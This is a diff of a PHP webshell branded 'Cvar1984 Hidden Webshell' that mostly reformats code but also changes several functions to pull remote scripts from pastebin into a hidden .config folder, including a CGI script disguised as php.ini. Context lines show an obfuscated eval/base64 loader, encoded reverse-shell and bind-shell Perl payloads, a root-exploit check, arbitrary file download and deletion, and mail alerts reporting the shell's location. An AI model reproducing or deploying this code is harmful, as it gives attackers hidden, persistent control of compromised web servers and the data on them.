@@ -12,15 +12,15 @@
 @ini_set('zlib.output_compression','Off');
 eval(gzuncompress(base64_decode("eNpTKS1OLcpLzE21VXIuSywytLQwUbLm5VIpSCwuLs8vSkEIGxoaQqRScxMzc2yV0lNTqooTi7JK85Lzc0vzMksyHdJBMnpArpK1AgDlEhyx")));
 function Zip($source, $destination) {
-if (!extension_loaded('zip') || !file_exists($source)) {
-        return false;
-        }
-    $zip = new ZipArchive();
-    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
-        return false;
-    }
-    $source = str_replace('\\', '/', realpath($source));
-if (is_dir($source) == true) {
+if(!extension_loaded('zip') || !file_exists($source)) {
+return false;
+}
+$zip=new ZipArchive();
+if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
+return false;
+}
+$source=str_replace('\\', '/', realpath($source));
+if(is_dir($source) == true) {
 $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
 foreach($files as $file) {
 $file=str_replace('\\', '/', realpath($file));
@@ -36,16 +36,16 @@ file_get_contents($source));
 }return $zip->close();
 }
 if(isset($_GET['zip'])) {
-	$src = $_GET['zip'];
-	$dst = getcwd()."/".basename($_GET['zip']).".zip";
-	if (Zip($src, $dst) != false) {
-		$filez = file_get_contents($dst);
-		header("Content-type: application/octet-stream");
-		header("Content-length: ".strlen($filez));
-		header("Content-disposition: attachment;
+$src = $_GET['zip'];
+$dst = getcwd()."/".basename($_GET['zip']).".zip";
+if(Zip($src, $dst) != false) {
+$filez = file_get_contents($dst);
+header("Content-type: application/octet-stream");
+header("Content-length: ".strlen($filez));
+header("Content-disposition: attachment;
 filename=\"".basename($dst)."\";");
-		echo $filez;
-	}exit;
+echo $filez;
+}exit;
 }
 @error_reporting(4);
 if(!empty($_SERVER['HTTP_USER_AGENT'])) {
@@ -317,18 +317,17 @@ echo "
     #divAlert { background-color:yellow; color:red;}
     </style>
 	<div id=divAlert></div>";
-if ($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password)) {
-        if ($_POST["usrname"] == $username && $_POST["passwrd"] == $password) {
-           
+if($_COOKIE["user"] != $username && $_COOKIE["pass"] != md5($password)) {
+if($_POST["usrname"] == $username && $_POST["passwrd"] == $password) {
 print '<script>document.cookie="user='.$_POST["usrname"].';";document.cookie="pass='.md5($_POST["passwrd"]).';";</script>';
-            if ($email != "") {
-                mail_alert();
-            }
-        }else {
-            if($_POST['usrname']) {
-                print'<script>alert("Wrong Username or password");</script>';
-            }
-            echo '
+if($email != "") {
+mail_alert();
+}
+}else {
+if($_POST['usrname']) {
+print'<script>alert("Wrong Username or password");</script>';
+}
+echo '
 <h1>Permission Denied</h1>
 <p>You don t have permission to access the this page.</p>
 <form method="post">
@@ -360,7 +359,6 @@ if(strtolower(substr(PHP_OS,0,3)) == "win") {
     $os="nix";
     $ox="Linux";
 }
-
 $self=$_SERVER['PHP_SELF'];
 $srvr_sof=$_SERVER['SERVER_SOFTWARE'];
 $your_ip=$_SERVER['REMOTE_ADDR'];
@@ -399,19 +397,17 @@ Satisfy Any";
 $sym_php_ini="
 safe_mode=OFF
 disable_functions=NONE";
-
 $forbid_dir="Options -Indexes";
-
 $cookie_highjacker="rVVdc5pAFH13xv9wh3Eipq22M3miasaJGGmNWsS2mU6HQVyEFlnCLkk7If+9d8EPCKFtpuVB2d1z7z177gf1Wvc8dMN6rXP6av/AJQlIZHGyBouBBaEVcaAOaNOhPninGWNYjNXJBMKIfiM2h53Zaadec+LA5h4N0AXX5nKrXruv1wAfzwF5QzgJbmVpbBhz82KiqVPD1OZSC05OgPHIthixt2El7CVIcfA9oHeB1GplXnfOxdPwQuhBle3bDPiQ/RGfkTKjz+Zopn8a6EN1KN5+z6sEfja7koc/cNTVq5mhmoPhsJpaAfMcRgXDCiIeY4TLDXOh6h9V/UszZ9P8mjKqOHtEtgL1N3QrTMuEK+wPEYoWEeFxFMiIEXd/yJWxTzdDi1u5QkbQhG56kk0Dx9vE2CaIY23+g++dNmxKv3ukQPfDUtWvzYWha9PLA99GRDYe4yQyNz5dWT5DE3lFqd8CL/BMzI3cPEJSRHOfHJGQkn2rmNWCSHvDNJ0ZbNejeHDgszVDis3+hNLzmW4cmccMo1obEhSxaWEvcWUOLrH1cje9YdzcEu7SdcHgSjXGs2Feka3pUvYkg/FskfdIHBKRqBxeV0eqrh6rorHGSdYTPyBLPqwXYpSN4BpcxVMYDA713sBk9xwakkCWsixLWJPWC+mokFA9RNXNrcVtV5Y6K5dvVx0PgZlFC5IESgi/ACkXtxPGnMkiPgbU5kqanwSE5EouKwkICZScSgkMRA6UQkISyFRVirIngMooR+ESGA4M9R4UeMg0wp2L2ey9pirHGu6uov5TA+F/XuGf7pBeQqm+QBA8pu/YPmUkpbrr9kOT45LYLgWpXuuKtPW7LrHWfVxxj/ukf/b6DKaUw4jGwbrbyTbxtJPCuiu6/imW7pt+DoUr3Av7hktw0NzEhIkP61KfgNQuFDnOiIVhLnUNJ2Zbgjv89gboxhFuAGcRdz0GKNEtidrdTpgGTkOKwXOOy18=";
 
 $bind_perl="rZJdb5swFIavi8R/OHXTFSSmZJu2i0abxAjtWApEQLtNVYUoOK1VgimmmqIq/30+dpKmmna1+Aq/7/Fzvjg6HD6JbnjLmmFLuxre/jYN0zjax5EY+P+jMee0oV3R0woKAQW0RdcDn0MQTRL3e5B9g5A1DNJ7WtfwdQlKm84+fhrBdRaf3Wwwe6lmP7MxjSdBIeXlA+3H+uLxZs7u5GXAhcr2GQZae+aiKRZ0hV7Lu/5AOm5yfnU9ulFSx3sutTvaq8/bJUZbJ33ZntgYUC4qaZO6rcgYUw/EUvR0gZpavbjXOptbmJs+AgnTH6z58J7YpvFsGgfrF7IkcuzFYTrzvWMYTvHZShFHWK3MozhCtWWlfnLlJw7MzvIg8jMH0tib5mmW+G7ogC7bBt5BxSgQ/eh0cIhQQXu88/aFksYXOQI0KE/8y9R3JxPptEX5YJGaOPDO3uFtEaegobLVaotDr6iqLmeNpYbqyN8Jebkb/drB4KMNoGZyCM1ORaH704uj6CVaR2ziTWPOO2ssW8VMckJFWVLZkncR+BG2oUD2GMqa4w+g5PXEeYuZskkQOUC+vNEewXVurfgy+6fnJ8lfnt6htd6lklRineb1XbJfCxKIwuoP";
 
 if($safemode == "On") {
-    echo "<div id='alert'><a class=\"alert_yellow\"
+echo "<div id='alert'><a class=\"alert_yellow\"
 href=\"#alert\">Safe Mode : <font
 color=red>ON</font></a></div>";
 }else {
-    echo "<div id='alert'><a class=\"alert_yellow\"
+echo "<div id='alert'><a class=\"alert_yellow\"
 href=\"#alert\">Safe Mode : <font
 color=lime>OFF</font></a></div>";
 }
@@ -422,13 +418,11 @@ echo "<title>Cvar1984 Hidden Webshell</title>
 <body bgcolor=black>
 <div id=result>
 <table>
-    <tbody>
-        <tr>
-            <td style='border-right:1px solid #104E8B;'
-width=\"300px;\">
-            <div style='text-align:center;'>
-                <a href='?'
-style='text-decoration:none;'>
+<tbody>
+<tr>
+<td style='border-right:1px solid #104E8B;' width=\"300px;\">
+<div style='text-align:center;'>
+<a href='?' style='text-decoration:none;'>
 <pre onkeydown=return false; onmousedown=return false; class=kedip style='color:lime;'>
 _________                     ____ ________  ______     _____  
 \_   ___ \___  _______ ______/_   /   __   \/  __  \   /  |  | 
@@ -450,48 +444,59 @@ color=yellow>=========== BlackHole Security ===========</font>
  Server IP : <font color=red>".$srvr_ip."</font>
  <font color=\"#666\" > | </font>
   Admin <font color=\"#666\" > : </font>
-			<font color=red> {$admin} </font><br>MySQL <font color=\"#666\" > : </font>"; 
-			echo mysqlx();
-            echo "<font color=\"#666\" > |
+ <font color=red> {$admin} </font><br>MySQL <font color=\"#666\" > : </font>"; 
+echo mysqlx();
+echo "<font color=\"#666\" > |
 </font> Oracle <font color=\"#666\" > :
-</font>"; echo oraclesx();
-            echo "<font color=\"#666\" > |
+</font>";
+echo oraclesx();
+echo "<font color=\"#666\" > |
 </font> MSSQL <font color=\"#666\" > :
-</font>"; echo mssqlx();
-            echo "<font color=\"#666\" > |
+</font>";
+echo mssqlx();
+echo "<font color=\"#666\" > |
 </font> PostGreySQL <font color=\"#666\" > :
-</font>";echo postgreyx();
-            echo "<br />cURL <font color=\"#666\"
-> : </font>";echo curlx();
-            echo "<font color=\"#666\" > |
+</font>";
+echo postgreyx();
+echo "<br />cURL <font color=\"#666\"
+> : </font>";
+echo curlx();
+echo "<font color=\"#666\" > |
 </font>Total Space<font color=\"#666\" > :
-</font>"; echo disc_size();
-            echo "<font color=\"#666\" > |
+</font>";
+echo disc_size();
+echo "<font color=\"#666\" > |
 </font>Free Space<font color=\"#666\" > :
-</font>"; echo freesize();
-            echo "<br />Software<font
+</font>";
+echo freesize();
+echo "<br />Software<font
 color=\"#666\" > : </font><font
-color=red>{$srvr_sof}</font><font color=\"#666\"
->
+color=red>{$srvr_sof}</font>
+<font color=\"#666\">
 | </font> PHP<font color=\"#666\" > :
-</font><a style='color:red; text-decoration:none;' target=_blank
-href=?phpinfo>".phpversion()."</a>
-            <br />Disabled Functions<font
+</font><a style='color:red; text-decoration:none;' target=_blank href=?phpinfo>".phpversion()."</a>
+<br />Disabled Functions<font
 color=\"#666\"
-> : </font></font><font color=red>";echo
-disabled_functns()."</font><br />";
-            if($os == 'win'){ echo  "Drives <font
-color=\"#666\" > : </font>";echo  drivesx(); }
-            else { echo "r00t Exploit <font
-color=\"#666\" > : </font><font color=red>";
-echo r00t_exploit() ."</font>"; }
-            echo "
-            </div>
-            </td>
-        </tr>
-    </tbody>
+> : </font></font><font color=red>";
+echo disabled_functns()."</font><br />";
+if($os == 'win') {
+echo  "Drives <font color=\"#666\" > : </font>";
+echo  drivesx(); }
+else {
+echo "r00t Exploit
+<font color=\"#666\" > : </font>
+<font color=red>";
+echo r00t_exploit() ."</font>";
+}
+echo "
+</div>
+</td>
+</tr>
+</tbody>
 </table></div>";
-echo "<div class='menubar'> <div id=\"meunlist\" align=center>
+echo "
+<div class='menubar'>
+<div id=\"meunlist\" align=center>
 <ul>
 <li>[<a href=\"?ngindex\">Priv Index</a>]</li>
 <li>[<a href=\"?cgi\">CGI Telnet</a>]</li>
@@ -530,22 +535,22 @@ echo "<div class='menubar'> <div id=\"meunlist\" align=center>
 </div>
 </div>";
 function alert($alert_txt) {
-    echo "<div id=divAlert>".$alert_txt."</div>";
-    echo "<script>alert('".$alert_txt."');window.location.href='?';</script>";
+echo "<div id=divAlert>".$alert_txt."</div>";
+echo "<script>alert('".$alert_txt."');window.location.href='?';</script>";
 }
 function disabled_functns() {
-    if (!@ini_get('disable_functions')) {
-        echo "None";
-    }else {
-	echo @ini_get('disable_functions');
-    }
+if(!@ini_get('disable_functions')) {
+echo "None";
+}else {
+echo @ini_get('disable_functions');
+}
 }
 function drivesx() {
-    foreach(range('A','Z') as $drive) {
-        if (is_dir($drive.':\\')) {
-            echo "<a> [<a style='color:aqua; text-decoration:none;' href='?path=".$drive.":\\'> ".$drive." </a>] </a>";
-        }
-    }
+foreach(range('A','Z') as $drive) {
+if(is_dir($drive.':\\')) {
+echo "<a> [<a style='color:aqua; text-decoration:none;' href='?path=".$drive.":\\'> ".$drive." </a>] </a>";
+}
+}
 }
 function mail_alert() {
 global $email;
@@ -557,17 +562,17 @@ $content_mail="URL : $shell_path\nIP : ".$_SERVER['REMOTE_ADDR'] ."\n**********\
 mail($email,$subject,$content_mail,$from);
 }
 function filesizex($size) {
-    if ($size>=1073741824)$size = round(($size/1073741824) ,2)." GB";
-    elseif ($size>=1048576)$size = round(($size/1048576),2)." MB";
-    elseif ($size>=1024)$size = round(($size/1024),2)." KB";
-    else $size .= " B";
-    return $size;
+if($size>=1073741824)$size = round(($size/1073741824) ,2)." GB";
+elseif($size>=1048576)$size = round(($size/1048576),2)." MB";
+elseif($size>=1024)$size = round(($size/1024),2)." KB";
+else $size .= " B";
+return $size;
 }
 function disc_size() {
-    echo filesizex(disk_total_space("/"));
+echo filesizex(disk_total_space("/"));
 }
 function freesize() {
-    echo filesizex(disk_free_space("/"));
+echo filesizex(disk_free_space("/"));
 }
 function file_perm($filz) {
 	if($m=fileperms($filz)) {
@@ -635,92 +640,105 @@ function rename_ui() {
 	<input type='submit' value='O'></form></p><br><br><hr><br><br></center></div>";
 }
 function cgi() {
-	$cgi_dir = mkdir('cgi', 0755);
-	$file_cgi = "cgi/cgi.izo";
-	$isi_htcgi = "AddHandler cgi-script .izo";
-	$htcgi = fopen("cgi/.htaccess", "w+");
-	$cgi_script = file_get_contents("https://pastebin.com/raw/MUD0EPjb");
-	$cgi = fopen($file_cgi, "w+");
-	fwrite($cgi, $cgi_script);
-	fwrite($htcgi, $isi_htcgi);
-	chmod($file_cgi, 0755);
-	echo "<iframe src='cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
+if(!file_exists('.config')) {
+mkdir('.config', 0755);
+}
+$file_cgi=".config/php.ini";
+$isi_htcgi="
+AddHandler cgi-script .ini
+Options -Indexes";
+$htcgi=fopen(".config/.htaccess", "w+");
+$cgi_script=file_get_contents("https://pastebin.com/raw/MUD0EPjb");
+$cgi=fopen($file_cgi, "w+");
+fwrite($cgi, $cgi_script);
+fwrite($htcgi, $isi_htcgi);
+chmod($file_cgi, 0755);
+echo "<iframe src='.config/php.ini' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
 }
 function rctm() {
-	echo "<iframe width='100%' height='100%' src='https://threatmap.fortiguard.com' frameborder='0'>";
+echo "<iframe width='100%' height='100%' src='https://threatmap.fortiguard.com' frameborder='0'>";
 }
 function soundcloud() {
-	echo "<iframe width='100%' height='100%' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
+echo "<iframe width='100%' height='100%' scrolling='no' frameborder='no' src='https://w.soundcloud.com/player/?url=https://api.soundcloud.com/playlists/355874911&amp;color=#00cc11&amp;auto_play=true&amp;hide_related=false&amp;show_comments=true&amp;show_user=true&amp;show_reposts=false&amp;show_teaser=true&amp;visual=true'></iframe>";
 }
 function idxshell() {
-$nama=fopen("idx.php", "w");
+if(!file_exists('.config')) {
+mkdir('.config', 0755);
+}
+$nama=fopen(".config/idx.php", "w");
 $file=file_get_contents('https://pastebin.com/raw/5UQAgFsp');
 fwrite ($nama, $file);
 chmod($nama, 0444);
 fclose($nama);
 }
 function adminer() {
-$nama=fopen("adminer.php", "w");
+if(!file_exists('.config')) {
+mkdir('.config', 0755);
+}
+$nama=fopen(".config/adminer.php", "w+");
 $file=file_get_contents('https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php');
 fwrite($nama, $file);
 fclose($nama);
 }
 function jembud2() {
-$nama=fopen("jembud2.php", "w");
+if(!file_exists('.config')) {
+mkdir('.config', 0755);
+}
+$nama=fopen(".config/jembud2.php", "w+");
 $file=file_get_contents('https://pastebin.com/raw/nCqVmtBu');
 fwrite($nama, $file);
 chmod($nama, 0444);
 fclose($nama);
 }
 function ngindex() {
-$nama=fopen("home.php", "w");
+$nama=fopen("Cvar1984.php", "w+");
 $file=file_get_contents('https://pastebin.com/raw/LVGSGa1m');
 fwrite($nama, $file);
 chmod($nama, 0444);
 fclose($nama);
 }
 function filemanager_bg() {
-    global $sep, $self;
-    $path =! empty($_GET['path'])?$_GET['path']:getcwd();
-    $dirs=array();
-    $fils=array();
-    if(is_dir($path)) {
-        chdir($path);
-        if($handle=opendir($path)) {
-            while(($item=readdir($handle)) !== FALSE) {
-                if ($item == "."){continue;}
-                if ($item == ".."){continue;}
-                if (is_dir($item)) {
-                    array_push($dirs, $path.$sep.$item);
-                }else {
-                    array_push($fils, $path.$sep.$item);
-                }
-            }
-        }else {
-            alert("Access Denied for this operation");
-        }
-    }
-    else
-    {
-        alert("Directory Not Found!!!");
-    }
-    echo "<div id=result><table class=table>
+global $sep, $self;
+$path =! empty($_GET['path'])?$_GET['path']:getcwd();
+$dirs=array();
+$fils=array();
+if(is_dir($path)) {
+chdir($path);
+if($handle=opendir($path)) {
+while(($item=readdir($handle)) !== FALSE) {
+if($item == "."){continue;}
+if($item == ".."){continue;}
+if(is_dir($item)) {
+array_push($dirs, $path.$sep.$item);
+}else {
+array_push($fils, $path.$sep.$item);
+}
+}
+}else {
+alert("Access Denied for this operation");
+}
+}
+else {
+alert("Directory Not Found!!!");
+}
+echo "
+<div id=result>
+<table class=table>
     <tr>
     <th width='500px'>Name</th>
     <th width='100px'>Size</th>
     <th width='100px'>Permissions</th>
     <th width='500px'>Actions</th>
     </tr>";
-    foreach($dirs as $dir)
-    {
-        echo "<tr><td><a href='{$self}?path={$dir}'>".basename($dir)."</a></td>
-              <td>".filesize_x($dir)."</td>
-              <td><a href='{$self}?path={$path}&amp;perm={$dir}'>".file_perm($dir)."</a></td>
-              <td><a href='{$self}?path={$path}&amp;del_dir={$dir}'>Delete</a> |
+foreach($dirs as $dir) {
+echo "<tr><td><a href='{$self}?path={$dir}'>".basename($dir)."</a></td>
+<td>".filesize_x($dir)."</td>
+<td><a href='{$self}?path={$path}&amp;perm={$dir}'>".file_perm($dir)."</a></td>
+<td><a href='{$self}?path={$path}&amp;del_dir={$dir}'>Delete</a> |
 <a href='{$self}?path={$path}&amp;rename={$dir}'>Rename</a>
 | <a href='{$self}?zip={$dir}'> Download </a></td></tr>";
-    }
-    foreach($fils as $fil) {
+}
+foreach($fils as $fil) {
         echo "<tr><td><a href='{$self}?path={$path}&amp;read={$fil}'>".basename($fil)."</a></td>
               <td>".filesize_x($fil)."</td>
               <td><a href='{$self}?path={$path}&amp;perm={$fil}'>".file_perm($fil)."</a></td>
